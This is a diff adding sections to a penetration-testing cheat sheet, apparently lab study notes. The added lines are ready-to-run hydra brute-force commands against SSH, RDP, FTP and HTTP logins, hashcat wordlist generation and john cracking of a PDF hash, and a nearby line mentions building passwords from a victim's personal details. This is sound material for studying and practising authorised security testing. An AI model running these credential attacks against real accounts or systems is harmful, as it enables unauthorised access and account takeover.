@@ -53,6 +53,50 @@ crunch 6 8 -t ,@@^^%%
 cewl example.com -m 5 -w words.txt
 ```
 
+#### Simple SSH & RDP Examples
+
+```bash
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+...
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
+```
+
+#### Custom Wordlist
+
+```bash
+hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule custom-wordlist.txt > wicked.txt
+```
+
+#### Cracking PDF
+
+```bash
+pdf2john Infrustructure.pdf > pdf.hash
+john -wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
+```
+
+#### Hydra FTP Example (with known usernames)
+
+```bash
+hydra -I -V -f -L users.txt -u -P /opt/SecLists/Passwords/xato-net-10-million-passwords.txt 192.168.179.46 ftp
+```
+
+#### HTTP Examples
+
+As before, we'll specify -l for the user, -P for the wordlist, the target IP without any protocol, and a new http-post-form argument, which accepts three colon-delimited fields.
+
+The first field indicates the location of the login form. In this demonstration, the login form is located on the index.php web page. The second field specifies the request body used for providing a username and password to the login form, which we retrieved with Burp. Finally we must provide the failed login identifier, also known as a condition string.
+
+```bash
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+```
+
+When you run into Basic Authentication, use the following script as a reference:
+
+```bash
+hydra -I -l admin -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://192.168.249.201/:A=BASIC:F=401"
+```
+
+
 ### [CUPP](https://github.com/Mebus/cupp)
 
 Generate passwords based on your knowledge of the victim (names, dates...)
